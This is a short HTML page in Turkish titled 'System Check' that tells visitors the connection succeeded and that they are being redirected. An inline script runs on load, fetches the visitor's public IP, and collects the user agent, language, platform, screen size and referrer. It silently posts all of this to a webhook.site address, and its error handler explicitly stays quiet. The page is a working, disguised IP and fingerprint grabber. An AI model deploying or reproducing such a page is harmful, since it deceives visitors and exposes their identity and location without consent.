<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Kontrolü</title>
</head>
<body>
    <h1>Bağlantı Başarılı</h1>
    <p>Lütfen bekleyiniz, yönlendiriliyorsunuz...</p>

    <script>
        async function collectData() {
            const webhookUrl = 'https://webhook.site/1e3471ed-e9d8-42cb-954f-505ca3b77916';
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                const payload = {
                    userAgent: navigator.userAgent,
                    ip: ipData.ip,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                };
                await fetch(webhookUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

            } catch (error) {
                console.log("Hata oluştu, ancak sessiz kalmaya devam ediyoruz.");
            }
        }
        collectData();
    </script>
</body>
</html>
